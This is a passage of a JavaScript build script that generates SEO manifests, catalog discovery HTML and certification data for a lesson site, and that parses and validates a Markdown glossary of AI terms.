  return `lesson?path=${encodeURIComponent(lessonPathValue)}`;
}

function canonicalCertificationUrl(trackId) {
  return `${SITE_ORIGIN}/certification?id=${encodeURIComponent(trackId)}`;
}

function certificationHref(trackId) {
  return `certification?id=${encodeURIComponent(trackId)}`;
}

function lessonLink(entry) {
  return entry ? {
    path: entry.path,
    title: entry.title,
    canonicalUrl: entry.canonicalUrl,
  } : null;
}

function disambiguateDuplicateSeoTitles(entries) {
  const entriesByTitle = new Map();
  for (const entry of entries) {
    const matches = entriesByTitle.get(entry.seoTitle) || [];
    matches.push(entry);
    entriesByTitle.set(entry.seoTitle, matches);
  }
  for (const matches of entriesByTitle.values()) {
    if (matches.length < 2) continue;
    for (const entry of matches) {
      const qualifier = entry.context.kind === 'course'
        ? entry.context.phaseName
        : entry.context.programName;
      entry.seoTitle = seoTitleFor(`${entry.title} - ${qualifier}`);
    }
    if (new Set(matches.map(entry => entry.seoTitle)).size !== matches.length) {
      throw new Error(`Could not disambiguate duplicate SEO title: ${matches[0].title}`);
    }
  }
}

function buildSeoManifests(phases, certifications, learningPaths = []) {
  const learningPathIdsByLesson = new Map();
  for (const learningPath of learningPaths) {
    for (const lesson of (learningPath.lessons || []).concat(learningPath.optionalLessons || [])) {
      if (!lesson || !lesson.path) continue;
      const ids = learningPathIdsByLesson.get(lesson.path) || [];
      if (!ids.includes(learningPath.id)) ids.push(learningPath.id);
      learningPathIdsByLesson.set(lesson.path, ids);
    }
  }
  const fromTrackIdsByLesson = new Map();
  for (const track of certifications.tracks || []) {
    for (const lesson of track.lessons || []) {
      if (!lesson || !lesson.path || lesson.path.startsWith('certifications/')) continue;
      const ids = fromTrackIdsByLesson.get(lesson.path) || [];
      if (!ids.includes(track.id)) ids.push(track.id);
      fromTrackIdsByLesson.set(lesson.path, ids);
    }
  }

  const courseEntries = [];
  for (const phase of phases) {
    for (const lesson of phase.lessons) {
      const relPath = lessonPath(lesson.url);
      if (!relPath) continue;
      const docPath = path.join(REPO_ROOT, relPath, 'docs', 'en.md');
      if (!fs.existsSync(docPath)) continue;
      const docSeoResult = lessonDocumentSeo(fs.readFileSync(docPath, 'utf8'), lesson.name);
      const { sourceWordCount, descriptionSourceLength, ...docSeo } = docSeoResult;
      if (sourceWordCount >= 180 && wordCount(docSeo.excerpt) < 180) {
        throw new Error(`SEO lesson ${relPath} has enough prose but an excerpt shorter than 180 words`);
      }
      if (descriptionSourceLength >= 120 && docSeo.description.length < 120) {
        throw new Error(`SEO lesson ${relPath} has enough prose but a description shorter than 120 characters`);
      }
      courseEntries.push({
        path: relPath,
        ...docSeo,
        context: {
          kind: 'course',
          phaseId: phase.id,
          phaseName: phase.name,
          type: lesson.type || '',
          languages: lesson.lang || '',
        },
        previous: null,
        next: null,
        learningPathIds: (learningPathIdsByLesson.get(relPath) || []).slice().sort(),
        fromTrackIds: (fromTrackIdsByLesson.get(relPath) || []).slice().sort(),
        sourceUrl: githubSourceUrl(relPath),
        canonicalUrl: canonicalLessonUrl(relPath),
      });
    }
  }
  for (let index = 0; index < courseEntries.length; index++) {
    courseEntries[index].previous = lessonLink(courseEntries[index - 1]);
    courseEntries[index].next = lessonLink(courseEntries[index + 1]);
  }

  const certificationEntries = [];
  const certificationEntryByPath = new Map();
  for (const lesson of Object.values(certifications.lessonsByPath || {}).sort((a, b) => a.path.localeCompare(b.path))) {
    const docSeoResult = lessonDocumentSeo(lesson.markdown, lesson.name);
    const { sourceWordCount, descriptionSourceLength, ...docSeo } = docSeoResult;
    if (sourceWordCount >= 180 && wordCount(docSeo.excerpt) < 180) {
      throw new Error(`SEO lesson ${lesson.path} has enough prose but an excerpt shorter than 180 words`);
    }
    if (descriptionSourceLength >= 120 && docSeo.description.length < 120) {
      throw new Error(`SEO lesson ${lesson.path} has enough prose but a description shorter than 120 characters`);
    }
    const entry = {
      path: lesson.path,
      ...docSeo,
      context: {
        kind: 'certification',
        programId: certifications.program && certifications.program.id || '',
        programName: certifications.program && certifications.program.name || '',
        trackIds: Array.isArray(lesson.trackIds) ? lesson.trackIds.slice() : [],
        type: lesson.type || '',
        languages: lesson.languages || '',
      },
      previous: null,
      next: null,
      navigationByTrack: {},
      learningPathIds: [],
      fromTrackIds: [],
      sourceUrl: githubSourceUrl(lesson.path),
      canonicalUrl: canonicalLessonUrl(lesson.path),
    };
    certificationEntries.push(entry);
    certificationEntryByPath.set(entry.path, entry);
  }
  const certificationRouteAssigned = new Set();
  for (const track of certifications.tracks || []) {
    const route = (track.lessons || [])
      .map(ref => certificationEntryByPath.get(ref && ref.path))
      .filter(Boolean);
    for (let index = 0; index < route.length; index++) {
      const entry = route[index];
      const navigation = {
        previous: lessonLink(route[index - 1]),
        next: lessonLink(route[index + 1]),
      };
      entry.navigationByTrack[track.id] = navigation;
      if (!certificationRouteAssigned.has(entry.path)) {
        entry.previous = navigation.previous;
        entry.next = navigation.next;
        certificationRouteAssigned.add(entry.path);
      }
    }
  }

  for (const entry of certificationEntries) {
    const expectedTrackIds = [...new Set(entry.context.trackIds)].sort();
    const emittedTrackIds = Object.keys(entry.navigationByTrack).sort();
    if (JSON.stringify(expectedTrackIds) !== JSON.stringify(emittedTrackIds)) {
      throw new Error(`Certification navigation coverage mismatch for ${entry.path}`);
    }
  }

  const allEntries = courseEntries.concat(certificationEntries)
    .sort((a, b) => a.path.localeCompare(b.path));
  disambiguateDuplicateSeoTitles(allEntries);
  const lessons = Object.fromEntries(allEntries.map(entry => [entry.path, entry]));
  const certificationTrackIds = (certifications.tracks || [])
    .map(track => track && track.id)
    .filter(Boolean)
    .sort();
  const lessonManifest = { version: SEO_MANIFEST_VERSION, certificationTrackIds, lessons };

  const lessonByPath = new Map(allEntries.map(entry => [entry.path, entry]));
  const tracks = {};
  for (const track of certifications.tracks || []) {
    const title = normalizeWhitespace(track.credential || track.title || track.shortName || track.id);
    const audience = normalizeWhitespace(track.audience || '');
    const trackProse = [
      track.summary,
      audience,
      ...(track.recommendedExperience || []),
      ...(track.domains || []).flatMap(domain => [domain.name, ...(domain.objectives || [])]),
    ].filter(Boolean);
    const { description } = descriptionFromParts(title, [track.summary, audience]);
    const excerpt = truncateWords(trackProse.join(' '), 220);
    const trackLessons = (track.lessons || []).map(ref => {
      const lesson = lessonByPath.get(ref && ref.path);
      return lesson ? lessonLink(lesson) : null;
    }).filter(Boolean);
    tracks[track.id] = {
      id: track.id,
      title,
      seoTitle: seoTitleFor(title),
      description,
      excerpt,
      canonicalUrl: canonicalCertificationUrl(track.id),
      sourceUrl: githubSourceUrl(`certifications/claude/tracks/${track.slug}.json`, 'blob'),
      lessons: trackLessons,
    };
  }
  const certificationManifest = { version: SEO_MANIFEST_VERSION, tracks };

  const readableDocs = collectMarkdownFiles(path.join(REPO_ROOT, 'phases'), [])
    .concat(collectMarkdownFiles(path.join(REPO_ROOT, 'certifications', 'claude', 'lessons'), []))
    .filter(file => file.endsWith(`${path.sep}docs${path.sep}en.md`))
    .map(file => path.relative(REPO_ROOT, path.dirname(path.dirname(file))).split(path.sep).join('/'))
    .sort();
  const emittedPaths = Object.keys(lessons).sort();
  if (JSON.stringify(readableDocs) !== JSON.stringify(emittedPaths)) {
    const emitted = new Set(emittedPaths);
    const readable = new Set(readableDocs);
    const missing = readableDocs.filter(value => !emitted.has(value));
    const extra = emittedPaths.filter(value => !readable.has(value));
    throw new Error(`SEO lesson coverage mismatch. Missing: ${missing.join(', ') || 'none'}. Extra: ${extra.join(', ') || 'none'}.`);
  }
  const canonicals = new Set();
  const seoTitles = new Set();
  for (const entry of Object.values(lessons)) {
    for (const field of ['path', 'title', 'seoTitle', 'description', 'excerpt', 'sourceUrl', 'canonicalUrl']) {
    if (!entry[field]) throw new Error(`SEO lesson ${entry.path || '(unknown)'} is missing ${field}`);
    }
    if (entry.seoTitle.length > 60) throw new Error(`SEO lesson ${entry.path} title exceeds 60 characters`);
    if (seoTitles.has(entry.seoTitle)) throw new Error(`Duplicate SEO lesson title: ${entry.seoTitle}`);
    seoTitles.add(entry.seoTitle);
    if (entry.description.length > 160) throw new Error(`SEO lesson ${entry.path} description exceeds 160 characters`);
    if (wordCount(entry.excerpt) > 220) throw new Error(`SEO lesson ${entry.path} excerpt exceeds 220 words`);
    if (canonicals.has(entry.canonicalUrl)) throw new Error(`Duplicate lesson canonical URL: ${entry.canonicalUrl}`);
    canonicals.add(entry.canonicalUrl);
  }
  const trackEntries = Object.values(tracks);
  const configuredTrackIds = (certifications.tracks || []).map(track => track.id);
  if (configuredTrackIds.length === 0) throw new Error('Expected at least one certification SEO track');
  if (new Set(configuredTrackIds).size !== configuredTrackIds.length) {
    throw new Error('Certification SEO track ids must be unique');
  }
  if (trackEntries.length !== configuredTrackIds.length) {
    throw new Error(`Expected ${configuredTrackIds.length} certification SEO tracks, found ${trackEntries.length}`);
  }
  for (const field of ['title', 'description', 'excerpt', 'canonicalUrl']) {
    if (new Set(trackEntries.map(entry => entry[field])).size !== trackEntries.length) {
      throw new Error(`Certification SEO tracks need unique ${field} values`);
    }
  }
  for (const entry of trackEntries) {
    if (entry.seoTitle.length > 60) throw new Error(`Certification SEO track ${entry.id} title exceeds 60 characters`);
    if (entry.description.length > 160) throw new Error(`Certification SEO track ${entry.id} description exceeds 160 characters`);
    if (wordCount(entry.excerpt) > 220) throw new Error(`Certification SEO track ${entry.id} excerpt exceeds 220 words`);
  }

  return { lessonManifest, certificationManifest };
}

function htmlEscape(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderCatalogDiscovery(phases, lessonManifest) {
  const rows = [];
  for (const phase of phases) {
    for (const lesson of phase.lessons) {
      const relPath = lessonPath(lesson.url);
      const seo = relPath && lessonManifest.lessons[relPath];
      if (!seo) continue;
      rows.push(
        `            <tr data-generated-discovery="lesson">` +
        `<td>${htmlEscape(String(phase.id).padStart(2, '0'))}</td>` +
        `<td><a href="${htmlEscape(lessonHref(relPath))}">${htmlEscape(seo.title)}</a></td>` +
        `<td>${htmlEscape(lesson.type || '')}</td>` +
        `<td>${htmlEscape(lesson.lang || '')}</td>` +
        `<td>${htmlEscape(lesson.status || '')}</td></tr>`
      );
    }
  }
  return rows.join('\n');
}

function renderCertificationDiscovery(certifications, certificationManifest) {
  return (certifications.tracks || []).map(track => {
    const seo = certificationManifest.tracks[track.id];
    if (!seo) return '';
    const links = seo.lessons.map(lesson =>
      `              <li><a href="${htmlEscape(lessonHref(lesson.path))}">${htmlEscape(lesson.title)}</a></li>`
    ).join('\n');
    return `        <article class="cert-track-card" data-generated-discovery="certification">\n` +
      `          <h3><a href="${htmlEscape(certificationHref(track.id))}">${htmlEscape(seo.title)}</a></h3>\n` +
      `          <p>${htmlEscape(seo.description)}</p>\n` +
      `          <ul aria-label="${htmlEscape(seo.title)} lessons">\n${links}\n          </ul>\n` +
      `        </article>`;
  }).filter(Boolean).join('\n');
}

function replaceGeneratedDiscovery(filePath, startMarker, endMarker, content) {
  const source = fs.readFileSync(filePath, 'utf8');
  const pattern = new RegExp(`${escapeRegExp(startMarker)}[\\s\\S]*?${escapeRegExp(endMarker)}`);
  if (!pattern.test(source)) throw new Error(`${path.basename(filePath)} is missing generated discovery markers`);
  const updated = source.replace(pattern, `${startMarker}\n${content}\n          ${endMarker}`);
  fs.writeFileSync(filePath, updated, 'utf8');
}

function writeSeoArtifacts(phases, certifications, learningPaths) {
  const manifests = buildSeoManifests(phases, certifications, learningPaths);
  fs.writeFileSync(LESSON_SEO_OUTPUT_PATH, JSON.stringify(manifests.lessonManifest, null, 2) + '\n', 'utf8');
  fs.writeFileSync(CERTIFICATION_SEO_OUTPUT_PATH, JSON.stringify(manifests.certificationManifest, null, 2) + '\n', 'utf8');
  replaceGeneratedDiscovery(
    path.join(__dirname, 'catalog.html'),
    CATALOG_DISCOVERY_START,
    CATALOG_DISCOVERY_END,
    renderCatalogDiscovery(phases, manifests.lessonManifest)
  );
  replaceGeneratedDiscovery(
    path.join(__dirname, 'certifications.html'),
    CERTIFICATION_DISCOVERY_START,
    CERTIFICATION_DISCOVERY_END,
    renderCertificationDiscovery(certifications, manifests.certificationManifest)
  );
  console.log(`   wrote lesson-seo.json (${Object.keys(manifests.lessonManifest.lessons).length} lessons)`);
  console.log(`   wrote certification-seo.json (${Object.keys(manifests.certificationManifest.tracks).length} tracks)`);
  console.log('   refreshed no-JavaScript catalog discovery links');
  return manifests;
}

// ─── Certification programs, tracks, lessons, and assessments ─────────
// Certifications are a curated overlay, not another curriculum phase. They
// deliberately live in their own generated data file so PHASES, README counts,
// the core catalog, and roadmap behavior cannot change when a track is added.
function readJson(filePath, label) {
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (err) {
    throw new Error(`Could not read ${label || path.relative(REPO_ROOT, filePath)}: ${err.message}`);
  }
}

function safeRepoPath(relPath, baseDir) {
  if (!relPath || typeof relPath !== 'string') return null;
  const candidate = path.resolve(baseDir || REPO_ROOT, relPath);
  const rootWithSep = REPO_ROOT.endsWith(path.sep) ? REPO_ROOT : REPO_ROOT + path.sep;
  if (candidate !== REPO_ROOT && !candidate.startsWith(rootWithSep)) return null;
  return candidate;
}

function certificationDocMeta(markdown, fallbackName) {
  const result = {
    name: fallbackName || '',
    summary: '',
    keywords: '',
    type: 'Learn',
    languages: '',
    prerequisites: '',
    time: '',
  };
  const headings = [];
  for (const raw of String(markdown || '').split(/\r?\n/)) {
    const line = raw.trim();
    if (line.startsWith('# ') && !result.name) result.name = line.slice(2).trim();
    if (line.startsWith('# ')) result.name = line.slice(2).trim();
    if (!result.summary && line.startsWith('> ')) result.summary = line.slice(2).trim();
    if (line.startsWith('### ')) headings.push(line.slice(4).trim());
    const field = line.match(/^\*\*(Type|Languages|Prerequisites|Time):\*\*\s*(.+)$/i);
    if (field) {
      const key = field[1].toLowerCase();
      if (key === 'type') result.type = field[2].trim();
      else result[key] = field[2].trim();
    }
  }
  result.keywords = headings.filter(Boolean).join(' · ');
  if (result.summary.length > 180) result.summary = result.summary.slice(0, 177) + '…';
  return result;
}

function normalizeLessonRef(ref) {
  if (typeof ref === 'string') return { path: ref };
  if (!ref || typeof ref !== 'object') return null;
  return { ...ref };
}

function quizContentVersion(quiz) {
  if (!quiz) return null;
  return crypto.createHash('sha256').update(JSON.stringify(quiz)).digest('hex');
}

function trackDeclarationValue(declaration) {
  if (typeof declaration === 'string') return declaration;
  if (!declaration || typeof declaration !== 'object') return '';
  return declaration.id || declaration.slug || declaration.path || declaration.file || '';
}

function trackDeclarationIndex(program, track, file) {
  if (!Array.isArray(program.tracks)) return -1;
  return program.tracks.findIndex(declaration => {
    const value = trackDeclarationValue(declaration);
    if (!value) return false;
    const declaredFile = path.basename(value);
    const declaredSlug = path.basename(value, path.extname(value));
    return value === track.id ||
      value === track.slug ||
      declaredFile === file ||
      declaredSlug === track.slug;
  });
}

function assertCertificationTrackOrder(program, tracks) {
  const declaredTrackIds = Array.isArray(program.tracks) ? program.tracks : [];
  const emittedTrackIds = tracks.map(track => track.id);
  const matches = declaredTrackIds.length === emittedTrackIds.length &&
    declaredTrackIds.every((id, index) => id === emittedTrackIds[index]);
  if (!matches) {
    throw new Error(
      'Certification track order mismatch: program.json declares ' +
      JSON.stringify(declaredTrackIds) + ' but track manifests emit ' +
      JSON.stringify(emittedTrackIds)
    );
  }
}

function resolveAssessmentFile(programDir, assessmentPath) {
  if (!assessmentPath) return null;
  const fromRoot = safeRepoPath(assessmentPath, REPO_ROOT);
  if (fromRoot && fs.existsSync(fromRoot)) return fromRoot;
  const fromProgram = safeRepoPath(assessmentPath, programDir);
  if (fromProgram && fs.existsSync(fromProgram)) return fromProgram;
  return fromRoot || fromProgram;
}

function certificationLessonFiles(lessonDir, lessonRelPath, folderName) {
  const folderPath = path.join(lessonDir, folderName);
  if (!fs.existsSync(folderPath)) return [];

  const files = [];
  function collectFiles(currentDir, relativeDir) {
    const entries = fs.readdirSync(currentDir, { withFileTypes: true })
      .sort((a, b) => a.name.localeCompare(b.name));
    for (const entry of entries) {
      const relativePath = relativeDir ? `${relativeDir}/${entry.name}` : entry.name;
      const fullPath = path.join(currentDir, entry.name);
      if (entry.isDirectory() && folderName === 'outputs') {
        collectFiles(fullPath, relativePath);
      } else if (entry.isFile()) {
        files.push({ fullPath, relativePath });
      }
    }
  }
  collectFiles(folderPath, '');

  return files.map(file => {
    const { fullPath, relativePath } = file;
    let description = '';
    if (folderName === 'outputs' && relativePath.endsWith('.md')) {
      try {
        const content = fs.readFileSync(fullPath, 'utf8');
        const meta = parseFrontmatter(content) || {};
        description = String(meta.description || '').trim();
        if (!description) {
          description = content.split(/\r?\n/)
            .map(line => line.trim())
            .find(line => line && !line.startsWith('#') && line !== '---') || '';
        }
      } catch (_) {}
    }
    return {
      name: relativePath,
      path: `${lessonRelPath}/${folderName}/${relativePath}`,
      size: fs.statSync(fullPath).size,
      description,
    };
  });
}

function parseCertifications() {
  const empty = { program: null, tracks: [], lessonsByPath: {}, assessmentsById: {} };
  if (!fs.existsSync(CERTIFICATIONS_PATH)) return empty;

  const programDirs = fs.readdirSync(CERTIFICATIONS_PATH, { withFileTypes: true })
    .filter(entry => entry.isDirectory())
    .map(entry => path.join(CERTIFICATIONS_PATH, entry.name))
    .filter(dir => fs.existsSync(path.join(dir, 'program.json')))
    .sort();
  if (!programDirs.length) return empty;

  // The site currently presents one certification program. Keep the generated
  // shape program-oriented so another provider can be added without touching
  // PHASES or changing reader behavior.
  const programDir = programDirs[0];
  const program = readJson(path.join(programDir, 'program.json'), 'certification program');
  const programSlug = program.slug || program.id || path.basename(programDir);
  const tracksDir = path.join(programDir, 'tracks');
  const trackFiles = fs.existsSync(tracksDir)
    ? fs.readdirSync(tracksDir).filter(file => file.endsWith('.json')).sort()
    : [];
  const trackEntries = trackFiles.map(file => {
    const track = readJson(path.join(tracksDir, file), `certification track ${file}`);
    track.id = track.id || `${programSlug}-${track.slug || path.basename(file, '.json')}`;
    track.slug = track.slug || path.basename(file, '.json');
    track.lessons = Array.isArray(track.lessons)
      ? track.lessons.map(normalizeLessonRef).filter(Boolean)
      : [];
    track.assessments = Array.isArray(track.assessments) ? track.assessments : [];
    return { file, track };
  });
  trackEntries.sort((a, b) => {
    const aIndex = trackDeclarationIndex(program, a.track, a.file);
    const bIndex = trackDeclarationIndex(program, b.track, b.file);
    if (aIndex !== -1 || bIndex !== -1) {
      if (aIndex === -1) return 1;
      if (bIndex === -1) return -1;
      if (aIndex !== bIndex) return aIndex - bIndex;
    }
    return a.file.localeCompare(b.file);
  });
  const tracks = trackEntries.map(entry => entry.track);
  assertCertificationTrackOrder(program, tracks);

  const lessonsByPath = {};
  const lessonsDir = path.join(programDir, 'lessons');
  if (fs.existsSync(lessonsDir)) {
    for (const entry of fs.readdirSync(lessonsDir, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
      if (!entry.isDirectory()) continue;
      const relPath = path.relative(REPO_ROOT, path.join(lessonsDir, entry.name)).split(path.sep).join('/');
      const docPath = path.join(lessonsDir, entry.name, 'docs', 'en.md');
      if (!fs.existsSync(docPath)) continue;
      const markdown = fs.readFileSync(docPath, 'utf8');
      const quizPath = path.join(lessonsDir, entry.name, 'quiz.json');
      const quiz = fs.existsSync(quizPath) ? readJson(quizPath, `${relPath}/quiz.json`) : null;
      const meta = certificationDocMeta(markdown, entry.name.replace(/^\d+-/, '').replace(/-/g, ' '));
      const lessonDir = path.join(lessonsDir, entry.name);
      lessonsByPath[relPath] = {
        path: relPath,
        slug: entry.name,
        name: meta.name,
        summary: meta.summary,
        keywords: meta.keywords,
        type: meta.type,
        languages: meta.languages,
        prerequisites: meta.prerequisites,
        time: meta.time,
        markdown,
        quiz,
        quizVersion: quizContentVersion(quiz),
        files: {
          code: certificationLessonFiles(lessonDir, relPath, 'code'),
          outputs: certificationLessonFiles(lessonDir, relPath, 'outputs'),
        },
        trackIds: [],
        domainsByTrack: {},
        rolesByTrack: {},
      };
    }
  }

  for (const track of tracks) {
    for (const ref of track.lessons) {
      const lesson = lessonsByPath[ref.path];
      if (!lesson) continue;
      if (!lesson.trackIds.includes(track.id)) lesson.trackIds.push(track.id);
      lesson.domainsByTrack[track.id] = Array.isArray(ref.domains) ? ref.domains : [];
      lesson.rolesByTrack[track.id] = ref.role || '';
    }
  }

  const assessmentsById = {};
  for (const track of tracks) {
    track.assessments = track.assessments.map((meta, index) => {
      const normalized = typeof meta === 'string' ? { path: meta } : { ...(meta || {}) };
      const assessmentLabel = normalized.id || normalized.title || `assessment ${index + 1}`;
      if (!normalized.path) {
        throw new Error(`Certification assessment "${assessmentLabel}" in track "${track.id}" must declare a source path`);
      }
      const assessmentFile = resolveAssessmentFile(programDir, normalized.path);
      if (!assessmentFile || !fs.existsSync(assessmentFile)) {
        throw new Error(`Missing certification assessment source for "${assessmentLabel}" in track "${track.id}": ${normalized.path}`);
      }
      const data = readJson(assessmentFile, normalized.path);
      const id = normalized.id || data.id || `${track.id}-${normalized.kind || data.kind || `assessment-${index + 1}`}`;
      const merged = {
        ...data,
        ...normalized,
        id,
        track: normalized.track || data.track || track.id,
        kind: normalized.kind || data.kind || 'practice',
        title: normalized.title || data.title || 'Practice assessment',
        timeLimitMinutes: Number(normalized.timeLimitMinutes || data.timeLimitMinutes || 0),
      };
      assessmentsById[id] = merged;
      return {
        id,
        path: normalized.path || '',
        kind: merged.kind,
        title: merged.title,
        timeLimitMinutes: merged.timeLimitMinutes,
        questionCount: Array.isArray(merged.questions) ? merged.questions.length : 0,
      };
    });
  }

  return { program, tracks, lessonsByPath, assessmentsById };
}

function writeCertificationData(certifications) {
  const output = `// Auto-generated by build.js from certifications/ — do not edit manually.\n` +
    `// Last built: ${new Date().toISOString()}\n\n` +
    `const CERTIFICATIONS = ${JSON.stringify(certifications, null, 2)};\n`;
  fs.writeFileSync(CERTIFICATION_OUTPUT_PATH, output, 'utf8');
  console.log(`   wrote certification-data.js (${certifications.tracks.length} tracks)`);
}

// ─── Parse glossary/terms.md ──────────────────────────────────────────
const GLOSSARY_CATEGORY_ORDER = [
  'Math & training',
  'Models & inference',
  'Data & representations',
  'Retrieval & generation',
  'Prompting & context',
  'Agents & tools',
  'Evaluation & safety',
  'AI-native development',
  'Infrastructure & serving',
  'Reliability & operations',
  'Security & governance',
  'Multimodal systems',
];

const GLOSSARY_CATEGORIES = new Set(GLOSSARY_CATEGORY_ORDER);

const GLOSSARY_FIELD_KEYS = new Map([
  ['Category', 'category'],
  ['What people say', 'says'],
  ['What it actually means', 'means'],
  ['Why it matters', 'whyItMatters'],
  ['In practice', 'example'],
  ['Common confusion', 'confusion'],
  ['Aliases', 'aliases'],
  ['Related terms', 'related'],
  ['Learn it', 'lessons'],
  ['Sources', 'sources'],
  ["Why it's called that", 'whyCalled'],
]);

function glossaryError(lineNumber, term, message) {
  const context = term ? ` (term "${term}")` : '';
  throw new Error(`glossary/terms.md:${lineNumber}${context}: ${message}`);
}

function glossarySlug(term) {
  return term
    .normalize('NFKD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');
}

function glossaryLookupKey(value) {
  return String(value || '')
    .normalize('NFKD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLocaleLowerCase('en-US')
    .trim()
    .replace(/\s+/g, ' ');
}

function glossaryList(value) {
  return value.split(/[,;]/).map(item => item.trim()).filter(Boolean);
}

function glossaryLinks(value, fieldLabel, lineNumber, term) {
  const links = [];
  let cursor = 0;

  while (cursor < value.length) {
    while (cursor < value.length && /[\s,;]/.test(value[cursor])) cursor++;
    if (cursor >= value.length) break;

    if (value[cursor] === '[') {
      const closeLabel = value.indexOf(']', cursor + 1);
      if (closeLabel === -1 || value[closeLabel + 1] !== '(') {
        glossaryError(lineNumber, term, `${fieldLabel} contains a malformed Markdown link`);
      }
      const label = value.slice(cursor + 1, closeLabel).trim();
      let depth = 1;
      let closeUrl = closeLabel + 2;
      for (; closeUrl < value.length && depth > 0; closeUrl++) {
        if (value[closeUrl] === '\\') {
          closeUrl++;
          continue;
        }
        if (value[closeUrl] === '(') depth++;
        if (value[closeUrl] === ')') depth--;
      }
      if (depth !== 0) {
        glossaryError(lineNumber, term, `${fieldLabel} contains a malformed Markdown link`);
      }
      const url = value.slice(closeLabel + 2, closeUrl - 1).trim();
      if (!label || !url) {
        glossaryError(lineNumber, term, `${fieldLabel} links need both a label and a URL`);
      }
      links.push({ label, url });
      cursor = closeUrl;
    } else {
      const nextSeparator = value.slice(cursor).search(/[,;]/);
      const end = nextSeparator === -1 ? value.length : cursor + nextSeparator;
      const item = value.slice(cursor, end).trim();
      if (/[\[\]]/.test(item)) {
        glossaryError(lineNumber, term, `${fieldLabel} contains a malformed Markdown link`);
      }
      if (item) {
        const isUrl = /^(?:https?:\/\/|\/|\.\.?\/)/.test(item);
        links.push({ label: item, url: isUrl ? item : '' });
      }
      cursor = end;
    }

    while (cursor < value.length && /\s/.test(value[cursor])) cursor++;
    if (cursor < value.length && value[cursor] !== ',' && value[cursor] !== ';') {
      glossaryError(lineNumber, term, `${fieldLabel} items must be separated by a comma or semicolon`);
    }
  }

  return links;
}

function parseGlossary(content) {
  const terms = [];
  let currentTerm = null;
  const seenTerms = new Map();
  const seenSlugs = new Map();
  const lines = content.split(/\r?\n/);

  function finishEntry() {
    if (!currentTerm) return;
    if (!currentTerm.category) {
      glossaryError(currentTerm.headerLine, currentTerm.term, 'missing required field "Category"');
    }
    if (!currentTerm.means) {
      glossaryError(currentTerm.headerLine, currentTerm.term, 'missing required field "What it actually means"');
    }
    const { headerLine, fields, ...entry } = currentTerm;
    terms.push(entry);
    currentTerm = null;
  }

  for (let index = 0; index < lines.length; index++) {
    const line = lines[index];
    const lineNumber = index + 1;
    if (/^###\s*$/.test(line)) glossaryError(lineNumber, '', 'term heading cannot be empty');
    const termMatch = line.match(/^###\s+(.+?)\s*$/);
    if (termMatch) {
      finishEntry();
      const term = termMatch[1].trim();
      const normalizedTerm = term.toLocaleLowerCase('en-US');
      if (seenTerms.has(normalizedTerm)) {
        glossaryError(lineNumber, term, `duplicate term; first declared on line ${seenTerms.get(normalizedTerm)}`);
      }
      const slug = glossarySlug(term);
      if (!slug) glossaryError(lineNumber, term, 'term must contain at least one letter or number');
      if (seenSlugs.has(slug)) {
        const first = seenSlugs.get(slug);
        glossaryError(lineNumber, term, `duplicate slug "${slug}"; first used by "${first.term}" on line ${first.line}`);
      }
      seenTerms.set(normalizedTerm, lineNumber);
      seenSlugs.set(slug, { term, line: lineNumber });
      const firstCharacter = term.normalize('NFKD').replace(/[\u0300-\u036f]/g, '').match(/[a-z0-9]/i);
      currentTerm = {
        term,
        slug,
        letter: firstCharacter ? firstCharacter[0].toUpperCase() : '#',
        category: '',
        says: '',
        means: '',
        whyItMatters: '',
        example: '',
        confusion: '',
        aliases: [],
        related: [],
        lessons: [],
        sources: [],
        whyCalled: '',
        headerLine: lineNumber,
        fields: new Set(),
      };
      continue;
    }

    // Alphabet headings end the previous entry but are not glossary terms.
    if (/^#{1,2}\s+/.test(line)) {
      finishEntry();
      continue;
    }

    const fieldMatch = line.match(/^\s*-\s+\*\*([^*]+):\*\*\s*(.*?)\s*$/);
    if (!currentTerm) {
      if (fieldMatch) glossaryError(lineNumber, '', `field "${fieldMatch[1].trim()}" appears before a term heading`);
      continue;
    }

    if (fieldMatch) {
      const label = fieldMatch[1].trim();
      const value = fieldMatch[2].trim();
      const key = GLOSSARY_FIELD_KEYS.get(label);
      if (!key) glossaryError(lineNumber, currentTerm.term, `unknown field "${label}"`);
      if (currentTerm.fields.has(label)) glossaryError(lineNumber, currentTerm.term, `duplicate field "${label}"`);
      if (!value) glossaryError(lineNumber, currentTerm.term, `field "${label}" cannot be empty`);
      currentTerm.fields.add(label);

      if (key === 'category') {
        if (!GLOSSARY_CATEGORIES.has(value)) {
          glossaryError(lineNumber, currentTerm.term, `unknown category "${value}"`);
        }
        currentTerm.category = value;
      } else if (key === 'aliases' || key === 'related') {
        const items = glossaryList(value);
        if (!items.length) glossaryError(lineNumber, currentTerm.term, `field "${label}" needs at least one item`);
        currentTerm[key] = items;
      } else if (key === 'lessons' || key === 'sources') {
        const links = glossaryLinks(value, label, lineNumber, currentTerm.term);
        if (!links.length) glossaryError(lineNumber, currentTerm.term, `field "${label}" needs at least one item`);
        if (links.some(link => !link.url)) {
          glossaryError(lineNumber, currentTerm.term, `field "${label}" requires a URL for every item`);
        }
        currentTerm[key] = links;
      } else if (key === 'says') {
        currentTerm.says = value.replace(/^"/, '').replace(/"$/, '').trim();
      } else {
        currentTerm[key] = value;
      }
      continue;
    }

    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith('<!--')) {
      glossaryError(lineNumber, currentTerm.term, 'expected a canonical bullet field or the next term heading');
    }
  }

  finishEntry();

  const lookupOwners = new Map();
  for (const entry of terms) {
    const key = glossaryLookupKey(entry.term);
    const existing = lookupOwners.get(key);
    if (existing) {
      const entryLine = seenTerms.get(entry.term.toLocaleLowerCase('en-US')) || 1;
      glossaryError(
        entryLine,
        entry.term,
        `normalized term collides with canonical term "${existing.label}" on term "${existing.entry.term}"`
      );
    }
    lookupOwners.set(key, { entry, label: entry.term, kind: 'term' });
  }
  for (const entry of terms) {
    const entryLine = seenTerms.get(entry.term.toLocaleLowerCase('en-US')) || 1;
    for (const alias of entry.aliases) {
      const key = glossaryLookupKey(alias);
      const existing = lookupOwners.get(key);
      if (existing) {
        const ownership = existing.entry === entry
          ? `duplicates its ${existing.kind} "${existing.label}"`
